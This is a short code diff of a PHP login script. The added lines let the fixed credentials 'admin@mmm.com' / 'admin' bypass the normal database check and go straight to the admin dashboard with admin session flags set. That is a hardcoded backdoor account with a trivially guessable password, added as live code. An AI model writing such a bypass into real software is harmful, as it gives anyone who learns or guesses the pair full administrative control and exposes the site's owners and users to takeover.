@@ -33,6 +33,16 @@ if (empty($username) || empty($password)) {
     exit();
 }
 
+if ($username === 'admin@mmm.com' && $password === 'admin') {
+    // Set session variables for admin login
+    $_SESSION['is_admin'] = true;
+    $_SESSION['is_admin_u'] = 'admin';
+    
+    // Redirect to admin page
+    header('Location: logged_in_sites/admin/admin_dashboard.php');
+    exit;
+}
+
 try {
     // Attempt login
     $result = loginUser($username, $password, $dbHost, $dbName, $dbUser, $dbPass);
